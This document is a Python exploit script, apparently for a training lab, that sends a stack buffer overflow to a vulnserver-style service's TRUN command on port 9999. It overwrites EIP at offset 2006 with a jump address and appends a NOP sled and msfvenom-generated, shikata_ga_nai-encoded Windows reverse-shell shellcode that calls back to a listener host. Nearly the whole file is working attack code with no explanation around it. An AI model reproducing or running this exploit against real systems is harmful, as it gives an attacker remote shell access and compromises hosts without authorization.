# -*-coding:Latin-1 -*
import socket
import time
import sys
import struct

'''
$ msfvenom -p windows/shell_reverse_tcp -v shellcode EXITFUNC=thread LHOST=192.168.56.103 LPORT=4444 -f py -e x86/shikata_ga_nai -b "\x00"
'''

# ----- INPUT -----
target = '192.168.56.104'
port = 9999
offset = 2006
badchars = [0x00]
eipvalue = '0x625011af'
shellcode =  b""
shellcode += b"\xdd\xc7\xd9\x74\x24\xf4\x5d\xbb\xa3\x35\xad"
shellcode += b"\x81\x33\xc9\xb1\x52\x31\x5d\x17\x03\x5d\x17"
shellcode += b"\x83\x66\x31\x4f\x74\x94\xd2\x0d\x77\x64\x23"
shellcode += b"\x72\xf1\x81\x12\xb2\x65\xc2\x05\x02\xed\x86"
shellcode += b"\xa9\xe9\xa3\x32\x39\x9f\x6b\x35\x8a\x2a\x4a"
shellcode += b"\x78\x0b\x06\xae\x1b\x8f\x55\xe3\xfb\xae\x95"
shellcode += b"\xf6\xfa\xf7\xc8\xfb\xae\xa0\x87\xae\x5e\xc4"
shellcode += b"\xd2\x72\xd5\x96\xf3\xf2\x0a\x6e\xf5\xd3\x9d"
shellcode += b"\xe4\xac\xf3\x1c\x28\xc5\xbd\x06\x2d\xe0\x74"
shellcode += b"\xbd\x85\x9e\x86\x17\xd4\x5f\x24\x56\xd8\xad"
shellcode += b"\x34\x9f\xdf\x4d\x43\xe9\x23\xf3\x54\x2e\x59"
shellcode += b"\x2f\xd0\xb4\xf9\xa4\x42\x10\xfb\x69\x14\xd3"
shellcode += b"\xf7\xc6\x52\xbb\x1b\xd8\xb7\xb0\x20\x51\x36"
shellcode += b"\x16\xa1\x21\x1d\xb2\xe9\xf2\x3c\xe3\x57\x54"
shellcode += b"\x40\xf3\x37\x09\xe4\x78\xd5\x5e\x95\x23\xb2"
shellcode += b"\x93\x94\xdb\x42\xbc\xaf\xa8\x70\x63\x04\x26"
shellcode += b"\x39\xec\x82\xb1\x3e\xc7\x73\x2d\xc1\xe8\x83"
shellcode += b"\x64\x06\xbc\xd3\x1e\xaf\xbd\xbf\xde\x50\x68"
shellcode += b"\x6f\x8e\xfe\xc3\xd0\x7e\xbf\xb3\xb8\x94\x30"
shellcode += b"\xeb\xd9\x97\x9a\x84\x70\x62\x4d\x6b\x2c\x54"
shellcode += b"\xea\x03\x2f\xa4\xe5\x8f\xa6\x42\x6f\x20\xef"
shellcode += b"\xdd\x18\xd9\xaa\x95\xb9\x26\x61\xd0\xfa\xad"
shellcode += b"\x86\x25\xb4\x45\xe2\x35\x21\xa6\xb9\x67\xe4"
shellcode += b"\xb9\x17\x0f\x6a\x2b\xfc\xcf\xe5\x50\xab\x98"
shellcode += b"\xa2\xa7\xa2\x4c\x5f\x91\x1c\x72\xa2\x47\x66"
shellcode += b"\x36\x79\xb4\x69\xb7\x0c\x80\x4d\xa7\xc8\x09"
shellcode += b"\xca\x93\x84\x5f\x84\x4d\x63\x36\x66\x27\x3d"
shellcode += b"\xe5\x20\xaf\xb8\xc5\xf2\xa9\xc4\x03\x85\x55"
shellcode += b"\x74\xfa\xd0\x6a\xb9\x6a\xd5\x13\xa7\x0a\x1a"
shellcode += b"\xce\x63\x2a\xf9\xda\x99\xc3\xa4\x8f\x23\x8e"
shellcode += b"\x56\x7a\x67\xb7\xd4\x8e\x18\x4c\xc4\xfb\x1d"
shellcode += b"\x08\x42\x10\x6c\x01\x27\x16\xc3\x22\x62"
# -----------------

TIMEOUT = 2

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(TIMEOUT)
    s.connect((target, port))

    print('Sending evil data...')
    # ----- EXPLOIT -----
    s.recv(1024)
    eip = struct.pack("<I", int(eipvalue, 16))
    buffer = b'A' * offset + eip + b'\x90' * 16 + shellcode
    cmd = b'TRUN .' + buffer
    s.send(cmd)
    # -------------------
    print('Done!')
    s.close()

except socket.timeout:
    print('Remote host seems down!')
except Exception as e:
    print("Exception: %s" % str(e))
    sys.exit(1)
